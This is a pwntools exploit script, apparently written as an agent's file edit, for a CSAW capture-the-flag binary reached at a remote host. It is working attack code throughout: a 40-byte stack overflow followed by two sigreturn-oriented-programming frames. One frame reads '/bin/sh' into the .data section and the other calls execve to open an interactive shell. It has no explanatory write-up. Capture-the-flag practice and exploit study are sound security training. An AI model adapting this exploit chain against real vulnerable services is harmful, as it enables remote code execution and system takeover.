from pwn import *

context.arch = 'amd64'

# Gadgets
pop_rax = 0x40018a
syscall_ret = 0x400185
mov_eax_0xf_syscall = 0x400180

# .data section (writable)
data_addr = 0x601000

p = remote("pwn.chal.csaw.io", 8000)

# Stage 1: SROP to read "/bin/sh" into .data
frame1 = SigreturnFrame()
frame1.rax = 0  # read
frame1.rdi = 0  # stdin
frame1.rsi = data_addr
frame1.rdx = 8
frame1.rip = syscall_ret
frame1.rsp = data_addr + 0x100  # new stack for next stage

payload = b'A' * 40
payload += p64(mov_eax_0xf_syscall)
payload += bytes(frame1)

p.send(payload)
p.send(b'/bin/sh\x00')

# Stage 2: SROP to execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 59  # execve
frame2.rdi = data_addr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

payload2 = b'A' * 40
payload2 += p64(mov_eax_0xf_syscall)
payload2 += bytes(frame2)

p.send(payload2)

p.interactive()
end_of_edit

